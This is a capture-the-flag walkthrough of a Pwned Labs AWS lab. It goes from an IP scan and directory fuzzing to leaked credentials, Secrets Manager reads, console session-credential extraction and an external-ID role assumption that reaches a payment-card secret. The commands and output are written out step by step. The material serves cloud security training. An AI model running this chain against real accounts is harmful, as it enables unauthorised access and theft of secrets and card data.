### Lab link

https://app.pwnedlabs.io/labs/assume-privileged-role-with-external-id

### Scenario

Huge Logistics, a global force in the logistics and shipping industry, has reached out to your firm for a comprehensive security evaluation spanning both their on-premises and cloud setups. Early reconnaissance pointed out the IP address 52.0.51.234 as part of their digital footprint. Your mission is clear: use this IP as your entry point, navigate laterally through their system, and determine potential areas of impact. This isn't just a test of their defenses, but a test of your skill to find weak spots in a vast network. Time to dive in and uncover what lies beneath!

💡 We have also found access keys for the AWS user testing in a public GitHub repository belonging to Huge Logistics. However, initial enumeration using this account reveals that it has no usable permissions in the environment. These credentials have been provided in the Entry Point section above, maybe they can still be useful?

### Information provided 

```
IP Address: 52.0.51.234

Access Keys:-
Access key ID: AKIAWHEOT<REDACTED>
Secret access key: mqHNmiM+4Fx2qbTo9oQ<REDACTED> 
```

### Enumeration

Since we are provided with 2 sets of information this time, we will enumerate both of those.

#### AWS account enumeration

We have configured this account with the profile `ext_id` on our local system.

```
aws sts get-caller-identity --profile ext_id
```

```
{
    "UserId": "AIDAWHEOTHRF6HVELNEF5",
    "Account": "427648302155",
    "Arn": "arn:aws:iam::427648302155:user/testing"
}
```

The account is of a user named `testing`. Lets try a few commands.

```
aws iam list-attached-user-policies --user-name testing --profile ext_id
```

```
aws: [ERROR]: An error occurred (AccessDenied) when calling the ListAttachedUserPolicies operation: User: arn:aws:iam::427648302155:user/testing is not authorized to perform: iam:ListAttachedUserPolicies on resource: user testing because no identity-based policy allows the iam:ListAttachedUserPolicies action. Go to https://us-east-1.console.aws.amazon.com/iam/home?region=us-east-1#/authorization-details/dddiidd1k88ni0xc6dxnae76n for complete details, or call the GetRequestAuthorizationDetails API with the following authorization id: dddiidd1k88ni0xc6dxnae76n
```

As you can see, we are not authorized to run even some basic commands. We can use `pacu` to enumerate the permissions in this user using the `iam__enum_bruteforce` module

```
Pacu (ext_id:imported-ext_id) > whoami
```

```
{
  "UserName": "testing",
  "RoleName": null,
  "Arn": "arn:aws:iam::427648302155:user/testing",
  "AccountId": "427648302155",
  "UserId": "AIDAWHEOTHRF6HVELNEF5",
  "Roles": null,
  "Groups": [],
  "Policies": [],
  "AccessKeyId": "AKIAWHEOTHRFSKQN5YWQ",
  "SecretAccessKey": "mqHNmiM+4Fx2qbTo9oQ/********************",
  "SessionToken": null,
  "KeyAlias": "imported-ext_id",
  "PermissionsConfirmed": false,
  "Permissions": {
    "Allow": [
      "dynamodb:DescribeEndpoints",
      "sts:GetCallerIdentity",
      "sts:GetSessionToken"
    ],
    "Deny": []
  }
}
```

As we can see, we do not have many permissions. Lets move on to the IP address.

#### Service enumeration

For the IP address, we can start by using `nmap`

```
nmap 52.0.51.234
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-14 11:47 IST
Nmap scan report for ec2-52-0-51-234.compute-1.amazonaws.com (52.0.51.234)
Host is up (0.22s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 17.56 seconds
```

```
nmap 52.0.51.234 -p80 -sV -sC
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-14 11:49 IST
Nmap scan report for ec2-52-0-51-234.compute-1.amazonaws.com (52.0.51.234)
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Huge Logistics

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.56 seconds
```

We can observe in the above information that this is an Apache web server running on an EC2 instance in AWS cloud environment. Lets take a look at the website.

#### Web enumeration

![](./images/Pasted%20image%2020260914162230.png)

This is a very basic website with not much functionality. Lets move on to directory enumeration since we did not find anything interesting in the source code of the landing page.

We will be using `ffuf` alongwith `SecLists` for directory and file enumeration

```
ffuf -w /home/ayush-parab/ayush/SecLists/Discovery/Web-Content/common.txt -u http://52.0.51.234/FUZZ
```

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://52.0.51.234/FUZZ
 :: Wordlist         : FUZZ: /home/ayush-parab/ayush/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 228ms]
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 229ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 225ms]
css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 222ms]
img                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 227ms]
index.html              [Status: 200, Size: 18312, Words: 5745, Lines: 448, Duration: 225ms]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 224ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 224ms]
vendor                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 225ms]
:: Progress: [4751/4751] :: Job [1/1] :: 177 req/sec :: Duration: [0:00:27] :: Errors: 0 ::
```

There was nothing worthwhile in the discovered web directories. Let's enumerate using the common file extensions.

```
ffuf -w /home/ayush-parab/ayush/SecLists/Discovery/Web-Content/common.txt -u http://52.0.51.234/FUZZ -e .js,.txt,.json,.php
```

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://52.0.51.234/FUZZ
 :: Wordlist         : FUZZ: /home/ayush-parab/ayush/SecLists/Discovery/Web-Content/common.txt
 :: Extensions       : .js .txt .json .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta.js                 [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 223ms]
.hta.json               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 223ms]
.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 223ms]
.hta.txt                [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 223ms]
.hta.php                [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 222ms]
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 225ms]
.htaccess.json          [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 224ms]
.htaccess.php           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 224ms]
.htaccess.js            [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 225ms]
.htaccess.txt           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 225ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 224ms]
.htpasswd.txt           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 225ms]
.htpasswd.js            [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 225ms]
.htpasswd.json          [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 225ms]
.htpasswd.php           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 225ms]
config.json             [Status: 200, Size: 832, Words: 141, Lines: 21, Duration: 225ms]
css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 225ms]
img                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 225ms]
index.html              [Status: 200, Size: 18312, Words: 5745, Lines: 448, Duration: 225ms]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 224ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 225ms]
vendor                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 223ms]
:: Progress: [23755/23755] :: Job [1/1] :: 160 req/sec :: Duration: [0:02:15] :: Errors: 0 ::
```

In the above output, we can see `config.json` file is available with 200 OK response. Let's inspect it.

![](./images/Pasted%20image%2020260914162656.png)

We got leaked credentials!

### Initial foothold

Let us configure the leaked credentials that we have received to get an initial foothold into the environment.

```
aws sts get-caller-identity --profile ext_id_2
```

```
{
    "UserId": "AIDAWHEOTHRF7MLFMRGYH",
    "Account": "427648302155",
    "Arn": "arn:aws:iam::427648302155:user/data-bot"
}
```

As you can see above, I have configured the new user named `data-bot` as `ext_id_2` in my profiles.

We were also provided with the name of a S3 bucket in the leaked `config.json` file. Lets try to explore it.

```
aws s3 ls s3://hl-data-download --profile ext_id_2
```

```
2023-08-06 03:26:58       5200 LOG-1-TRANSACT.csv
2023-08-06 03:27:05       5200 LOG-10-TRANSACT.csv
2023-08-06 03:28:04       5200 LOG-100-TRANSACT.csv
2023-08-06 03:27:05       5200 LOG-11-TRANSACT.csv
2023-08-06 03:27:06       5200 LOG-12-TRANSACT.csv
2023-08-06 03:27:07       5200 LOG-13-TRANSACT.csv
2023-08-06 03:27:08       5200 LOG-14-TRANSACT.csv
2023-08-06 03:27:08       5200 LOG-15-TRANSACT.csv
2023-08-06 03:27:09       5200 LOG-16-TRANSACT.csv
2023-08-06 03:27:09       5200 LOG-17-TRANSACT.csv
2023-08-06 03:27:10       5200 LOG-18-TRANSACT.csv
2023-08-06 03:27:11       5200 LOG-19-TRANSACT.csv
2023-08-06 03:26:59       5200 LOG-2-TRANSACT.csv
```

`CSV` files of transactions are present in this bucket.

```
aws s3 cp s3://hl-data-download/LOG-93-TRANSACT.csv ./LOG-93-TRANSACT.csv --profile ext_id_2
```

```
download: s3://hl-data-download/LOG-93-TRANSACT.csv to ./LOG-93-TRANSACT.csv
```

We can exfiltrate this data!

Let us enumerate the permissions of `data-bot` user using `pacu`

```
data-bot user

whoami
{
  "UserName": null,
  "RoleName": null,
  "Arn": null,
  "AccountId": null,
  "UserId": null,
  "Roles": null,
  "Groups": null,
  "Policies": null,
  "AccessKeyId": "AKIAWHEOTHRFYM6CAHHG",
  "SecretAccessKey": "chMbGqbKdpwGOOLC9B53********************",
  "SessionToken": null,
  "KeyAlias": "imported-ext_id_2",
  "PermissionsConfirmed": null,
  "Permissions": {
    "Allow": [
      "dynamodb:DescribeEndpoints",
      "secretsmanager:ListSecrets",
      "sts:GetSessionToken",
      "sts:GetCallerIdentity"
    ],
    "Deny": []
  }
}
```

We can see that we have permission to list the secrets present inside the `secretsmanager`

```
aws secretsmanager list-secrets --profile ext_id_2
```

```
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:employee-database-admin-Bs8G8Z",
            "Name": "employee-database-admin",
            "Description": "Admin access to MySQL employee database",
            "LastChangedDate": "2023-07-12T23:45:38.909000+05:30",
            "LastAccessedDate": "2026-09-07T05:30:00+05:30",
            "Tags": [],
            "SecretVersionsToStages": {
                "41a82b5b-fb44-4ab3-8811-7ea171e9d3c1": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2023-07-12T23:44:35.740000+05:30"
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:employee-database-rpkQvl",
            "Name": "employee-database",
            "Description": "Access to MySQL employee database",
            "RotationEnabled": true,
            "RotationLambdaARN": "arn:aws:lambda:us-east-1:427648302155:function:SecretsManagermysql-rotation",
            "RotationRules": {
                "AutomaticallyAfterDays": 7,
                "ScheduleExpression": "cron(0 0 ? * 2 *)"
            },
            "LastRotatedDate": "2026-09-07T23:44:58.832000+05:30",
            "LastChangedDate": "2026-09-07T23:44:58.812000+05:30",
            "LastAccessedDate": "2026-09-09T05:30:00+05:30",
            "NextRotationDate": "2026-09-15T05:29:59+05:30",
            "Tags": [],
            "SecretVersionsToStages": {
                "58b637b5-ff08-4cfb-a3ca-74f147005e5f": [
                    "AWSCURRENT",
                    "AWSPENDING"
                ],
                "624f8542-84f1-4800-aae1-053118521973": [
                    "AWSPREVIOUS"
                ]
            },
            "CreatedDate": "2023-07-12T23:45:02.970000+05:30"
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:ext/cost-optimization-p6WMM4",
            "Name": "ext/cost-optimization",
            "Description": "Allow external partner to access cost optimization user and Huge Logistics resources",
            "LastChangedDate": "2023-08-07T01:40:16.392000+05:30",
            "LastAccessedDate": "2026-09-14T05:30:00+05:30",
            "Tags": [],
            "SecretVersionsToStages": {
                "f7d6ae91-5afd-4a53-93b9-92ee74d8469c": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2023-08-05T02:49:28.466000+05:30"
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:billing/hl-default-payment-xGmMhK",
            "Name": "billing/hl-default-payment",
            "Description": "Access to the default payment card for Huge Logistics",
            "LastChangedDate": "2023-08-05T04:03:39.872000+05:30",
            "LastAccessedDate": "2026-09-11T05:30:00+05:30",
            "Tags": [],
            "SecretVersionsToStages": {
                "f8e592ca-4d8a-4a85-b7fa-7059539192c5": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2023-08-05T04:03:39.828000+05:30"
        }
    ]
}
```

Lets try to get the values of these secrets.

```
aws secretsmanager get-secret-value --secret-id ext/cost-optimization --profile ext_id_2
```

```
{
    "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:ext/cost-optimization-p6WMM4",
    "Name": "ext/cost-optimization",
    "VersionId": "f7d6ae91-5afd-4a53-93b9-92ee74d8469c",
    "SecretString": "{\"Username\":\"ext-cost-user\",\"Password\":\"K33pOu<REDACTED>\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2023-08-05T02:49:28.512000+05:30"
}
```

We were successfully able to retrieve value of one of the secrets, other secret values were not accessible to this `data-bot` user.

### Lateral movement

Since we have received a username and a password, it probably belongs to the AWS management console.

![](./images/Pasted%20image%2020260914164902.png)

We were able to log in to the GUI however most of the things are restricted to us and it is very troublesome to enumerate using GUI.

#### Important method of extracting credentials using the GUI

Open the inspect menu ---> networks tab ---> refresh ---> filter with "creds"


![](./images/Screenshot%202026-09-14%20143130.png)

Here you can see that credentials are present in plain sight.

```
aws sts get-caller-identity --profile ext_id_3
```

```
{
    "UserId": "AIDAWHEOTHRFTNCWM7FHT",
    "Account": "427648302155",
    "Arn": "arn:aws:iam::427648302155:user/ext-cost-user"
}
```

We have configured this `ext-cost-user` as `ext_id_3` in our aws profiles.

The credentials we got from the web page are credentials pertaining to a certain combination of service and region.
Every service has its own set of credentials which cannot be used for other services.
So if you want to enumerate for IAM, you have to use creds from is service web page in management console.

```
https://{region}.console.aws.amazon.com/{service}/tb/creds
```

Above format is followed for every service. Every service has its own credential endpoint.

```
https://us-east-1.console.aws.amazon.com/iam/tb/creds
https://us-east-1.console.aws.amazon.com/s3/tb/creds
```

Now we will repeat the above steps on the `IAM` service page to get the new credentials related to IAM.

```
aws sts get-caller-identity --profile ext_id_3
```

```
aws: [ERROR]: An error occurred (InvalidClientTokenId) when calling the GetCallerIdentity operation: The security token included in the request is invalid
```

Now since we have configured the IAM service credentials, `sts` is throwing an error.

#### IAM enumeration

```
aws iam list-attached-user-policies --user-name ext-cost-user --profile ext_id_3
```

```
{
    "AttachedPolicies": [
        {
            "PolicyName": "ExtPolicyTest",
            "PolicyArn": "arn:aws:iam::427648302155:policy/ExtPolicyTest"
        }
    ]
}
```

Above command gives us the Policy attached to our user.

```
aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest --profile ext_id_3
```

```
{
    "Policy": {
        "PolicyName": "ExtPolicyTest",
        "PolicyId": "ANPAWHEOTHRF7772VGA5J",
        "Arn": "arn:aws:iam::427648302155:policy/ExtPolicyTest",
        "Path": "/",
        "DefaultVersionId": "v4",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "CreateDate": "2023-08-04T21:47:26+00:00",
        "UpdateDate": "2023-08-06T20:23:42+00:00",
        "Tags": []
    }
}
```

```
aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest --version-id v4 --profile ext_id_3
```

```
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetRole",
                        "iam:GetPolicyVersion",
                        "iam:GetPolicy",
                        "iam:GetUserPolicy",
                        "iam:ListAttachedRolePolicies",
                        "iam:ListAttachedUserPolicies",
                        "iam:GetRolePolicy"
                    ],
                    "Resource": [
                        "arn:aws:iam::427648302155:policy/ExtPolicyTest",
                        "arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess",
                        "arn:aws:iam::427648302155:policy/Payment",
                        "arn:aws:iam::427648302155:user/ext-cost-user"
                    ]
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
        "CreateDate": "2023-08-06T20:23:42+00:00"
    }
}
```

Using the above set of commands, we found out the exact permissions present in the policy attached to our user and information about a role present inside this account. We will enumerate the role next.

```
aws iam get-role --role-name ExternalCostOpimizeAccess --profile ext_id_3
```

```
{
    "Role": {
        "Path": "/",
        "RoleName": "ExternalCostOpimizeAccess",
        "RoleId": "AROAWHEOTHRFZP3NQR7WN",
        "Arn": "arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess",
        "CreateDate": "2023-08-04T21:09:30+00:00",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": "*"
                    },
                    "Action": "sts:AssumeRole",
                    "Condition": {
                        "StringEquals": {
                            "sts:ExternalId": "37911"
                        }
                    }
                }
            ]
        },
        "Description": "Allow trusted AWS cost optimization partner to access Huge Logistics resources",
        "MaxSessionDuration": 3600,
        "RoleLastUsed": {
            "LastUsedDate": "2026-09-14T09:44:14+00:00",
            "Region": "us-east-1"
        }
    }
}
```

In the above role, the `AssumeRolePolicyDocument` mentions that the role can be assumed by any user in the entire world, not limited to the users present inside the current AWS account. However there is one condition while assuming this role. The `ExternalId` string must equal `37911` which is specified in the condition.

Let us now look at the permissions present for this role via the attached policies.

```
aws iam list-attached-role-policies --role-name ExternalCostOpimizeAccess --profile ext_id_3
```

```
{
    "AttachedPolicies": [
        {
            "PolicyName": "Payment",
            "PolicyArn": "arn:aws:iam::427648302155:policy/Payment"
        }
    ]
}
```

```
aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/Payment --profile ext_id_3
```

```
{
    "Policy": {
        "PolicyName": "Payment",
        "PolicyId": "ANPAWHEOTHRFZCZIMJSVW",
        "Arn": "arn:aws:iam::427648302155:policy/Payment",
        "Path": "/",
        "DefaultVersionId": "v2",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "CreateDate": "2023-08-04T22:03:41+00:00",
        "UpdateDate": "2023-08-04T22:34:19+00:00",
        "Tags": []
    }
}
```

```
aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/Payment --version-id v2 --profile ext_id_3
```

```
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": [
                        "secretsmanager:GetSecretValue",
                        "secretsmanager:DescribeSecret",
                        "secretsmanager:ListSecretVersionIds"
                    ],
                    "Resource": "arn:aws:secretsmanager:us-east-1:427648302155:secret:billing/hl-default-payment-xGmMhK"
                },
                {
                    "Sid": "VisualEditor1",
                    "Effect": "Allow",
                    "Action": "secretsmanager:ListSecrets",
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2023-08-04T22:34:19+00:00"
    }
}
```

To get the permission details, we first listed the attached role policies. Then we got the version of the policy attached that is active right now. We used this version to get the contents of the role policy.

Here we can see that we have been provided the permission to `GetSecretValue` on one of the secrets present inside the secrets manager. Lets assume this role to escalate privileges.

### Privilege escalation

```
aws sts assume-role --role-arn arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess --role-session-name external-infiltration --external-id 37911 --profile ext_id 
```

```
{
    "Credentials": {
        "AccessKeyId": "ASIAW<REDACTED>",
        "SecretAccessKey": "eRcJ3zwh9i<REDACTED>",
        "SessionToken": "FwoGZXIvYXdzECwaD<REDACTED>",
        "Expiration": "2026-09-14T11:29:19+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAWHEOTHRFZP3NQR7WN:external-infiltration",
        "Arn": "arn:aws:sts::427648302155:assumed-role/ExternalCostOpimizeAccess/external-infiltration"
    },
    "PackedPolicySize": 8
}
```

We assumed the role using the very first account credentials we received configured as `ext_id` in AWS credentials on our system.

```
aws sts get-caller-identity --profile assumed_ext_id
```

```
{
    "UserId": "AROAWHEOTHRFZP3NQR7WN:external-infiltration",
    "Account": "427648302155",
    "Arn": "arn:aws:sts::427648302155:assumed-role/ExternalCostOpimizeAccess/external-infiltration"
}
```

I have configured these credentials under the `assumed_ext_id` profile locally.

### Data exfiltration

Since we know that we have higher privileges inside the secrets manager, we will enumerate that. This information was provided to us through the policy attached to the `role`.

```
aws secretsmanager list-secrets --profile assumed_ext_id
```

```
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:employee-database-admin-Bs8G8Z",
            "Name": "employee-database-admin",
            "Description": "Admin access to MySQL employee database",
            "LastChangedDate": "2023-07-12T23:45:38.909000+05:30",
            "LastAccessedDate": "2026-09-07T05:30:00+05:30",
            "Tags": [],
            "SecretVersionsToStages": {
                "41a82b5b-fb44-4ab3-8811-7ea171e9d3c1": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2023-07-12T23:44:35.740000+05:30"
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:employee-database-rpkQvl",
            "Name": "employee-database",
            "Description": "Access to MySQL employee database",
            "RotationEnabled": true,
            "RotationLambdaARN": "arn:aws:lambda:us-east-1:427648302155:function:SecretsManagermysql-rotation",
            "RotationRules": {
                "AutomaticallyAfterDays": 7,
                "ScheduleExpression": "cron(0 0 ? * 2 *)"
            },
            "LastRotatedDate": "2026-09-07T23:44:58.832000+05:30",
            "LastChangedDate": "2026-09-07T23:44:58.812000+05:30",
            "LastAccessedDate": "2026-09-09T05:30:00+05:30",
            "NextRotationDate": "2026-09-15T05:29:59+05:30",
            "Tags": [],
            "SecretVersionsToStages": {
                "58b637b5-ff08-4cfb-a3ca-74f147005e5f": [
                    "AWSCURRENT",
                    "AWSPENDING"
                ],
                "624f8542-84f1-4800-aae1-053118521973": [
                    "AWSPREVIOUS"
                ]
            },
            "CreatedDate": "2023-07-12T23:45:02.970000+05:30"
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:ext/cost-optimization-p6WMM4",
            "Name": "ext/cost-optimization",
            "Description": "Allow external partner to access cost optimization user and Huge Logistics resources",
            "LastChangedDate": "2023-08-07T01:40:16.392000+05:30",
            "LastAccessedDate": "2026-09-14T05:30:00+05:30",
            "Tags": [],
            "SecretVersionsToStages": {
                "f7d6ae91-5afd-4a53-93b9-92ee74d8469c": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2023-08-05T02:49:28.466000+05:30"
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:billing/hl-default-payment-xGmMhK",
            "Name": "billing/hl-default-payment",
            "Description": "Access to the default payment card for Huge Logistics",
            "LastChangedDate": "2023-08-05T04:03:39.872000+05:30",
            "LastAccessedDate": "2026-09-14T05:30:00+05:30",
            "Tags": [],
            "SecretVersionsToStages": {
                "f8e592ca-4d8a-4a85-b7fa-7059539192c5": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2023-08-05T04:03:39.828000+05:30"
        }
    ]
}
```

Out of these secrets, our assumed role has permissions to describe the value of `billing/hl-default-payment` secret.

```
aws secretsmanager get-secret-value --secret-id billing/hl-default-payment --profile assumed_ext_id
```

```
{
    "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:billing/hl-default-payment-xGmMhK",
    "Name": "billing/hl-default-payment",
    "VersionId": "f8e592ca-4d8a-4a85-b7fa-7059539192c5",
    "SecretString": "{\"Card Brand\":\"VISA\",\"Card Number\":\"4180-5677-2810-4227\",\"Holder Name\":\"Michael Hayes\",\"CVV/CVV2\":\"839\",\"Card Expiry\":\"5/2026\",\"Flag\":\"68131<REDACTED>\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2023-08-05T04:03:39.867000+05:30"
}
```

We got the value of the flag inside this secret!


